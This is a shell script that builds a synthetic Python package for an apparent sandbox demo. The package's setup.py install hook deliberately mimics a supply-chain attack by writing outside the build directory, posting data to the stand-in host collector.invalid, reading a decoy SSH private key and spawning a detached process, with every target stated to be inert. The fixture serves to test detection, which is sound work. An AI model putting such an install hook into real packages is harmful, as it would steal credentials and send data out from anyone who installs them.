#!/usr/bin/env bash
# Builds the synthetic probe package used in the demo.
#
# This is NOT malware and is not fetched from anywhere. It is a build hook that
# attempts four things a real supply-chain attack attempts, and writes down what
# happened. Targets are deliberately inert:
#   - /opt/ar-probe        : root-owned on the VM, read-only elsewhere
#   - collector.invalid    : .invalid never resolves (RFC 2606)
#   - $AR_DECOY_HOME/.ssh  : decoy path, nothing real is ever mounted
# Run:  bash fixtures/make_fixture.sh
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
NAME="sample_pkg"
VER="0.1.0"
BUILD="$(mktemp -d)"
trap 'rm -rf "$BUILD"' EXIT

mkdir -p "$BUILD/$NAME-$VER"

cat > "$BUILD/$NAME-$VER/setup.py" <<'PY'
# Synthetic probe fixture for the Agent Rush demo. Committed to this repo so the
# run is reproducible and reviewable. Every target is inert by design.
import os
import subprocess
import sys

FINDINGS = []


def _try(label, fn):
    try:
        FINDINGS.append("%s=ok:%s" % (label, fn()))
    except Exception as exc:  # noqa: BLE001 - the point is to classify the failure
        FINDINGS.append("%s=denied:%s" % (label, type(exc).__name__))


def write_outside_build_dir():
    path = "/opt/ar-probe"
    with open(path, "w") as fh:
        fh.write("probe\n")
    return path


def exfiltrate():
    import urllib.request
    req = urllib.request.Request(
        "http://collector.invalid/v1/collect",
        data=b"probe-payload",
        headers={"Content-Type": "application/octet-stream"},
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status


def read_decoy_secret():
    # Never points at a real home directory: the runner sets AR_DECOY_HOME to a
    # path that only exists inside the container's decoy tree.
    target = os.path.join(os.environ.get("AR_DECOY_HOME", "/nonexistent-ar-decoy"),
                          ".ssh", "id_rsa")
    with open(target, "rb") as fh:
        return "%d bytes" % len(fh.read(32))


def persist():
    # stdio to DEVNULL on purpose: an inherited stdout pipe keeps the parent's
    # reader alive and would hang the run until the timeout. Real droppers
    # detach the same way.
    subprocess.Popen(
        ["/bin/sleep", "300"],
        start_new_session=True,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return "spawned"


_try("write_/opt/ar-probe", write_outside_build_dir)
_try("egress_collector.invalid", exfiltrate)
_try("read_decoy_ssh_key", read_decoy_secret)
_try("spawn_detached", persist)


# pip swallows the hook's stdout/stderr when the build succeeds, so the report goes
# to a file the runner collects. Note: this channel is written BY the observed
# process, so it is self-report and spoofable. It is used for narrative only --
# severity comes from the proxy log and the filesystem diff, which the process
# cannot write to.
def _write_report():
    import json
    out = os.environ.get("AR_PROBE_OUT", "/work/out/probe.json")
    try:
        os.makedirs(os.path.dirname(out), exist_ok=True)
        with open(out, "w") as fh:
            json.dump({"attempts": FINDINGS}, fh, indent=2)
    except Exception:  # noqa: BLE001 - a failed report must not break the build
        pass


_write_report()
print("AR_PROBE " + " | ".join(FINDINGS), file=sys.stderr)

from setuptools import setup  # noqa: E402

setup(
    name="sample-pkg",
    version="0.1.0",
    description="synthetic probe fixture (Agent Rush demo)",
    py_modules=[],
)
PY

cat > "$BUILD/$NAME-$VER/README.md" <<'MD'
Synthetic probe package. Not a real library. See fixtures/make_fixture.sh.
MD

# COPYFILE_DISABLE stops bsdtar (macOS) from adding AppleDouble ._* entries and xattr
# headers. Without it the archive root also contains ._sample_pkg-0.1.0 and pip
# refuses the file with "does not appear to be a Python project". GNU tar ignores
# the variable, so the same command works on the Linux VM.
COPYFILE_DISABLE=1 tar czf "$HERE/$NAME-$VER.tar.gz" --exclude '._*' -C "$BUILD" "$NAME-$VER"
echo "built: $HERE/$NAME-$VER.tar.gz"
tar tzf "$HERE/$NAME-$VER.tar.gz"
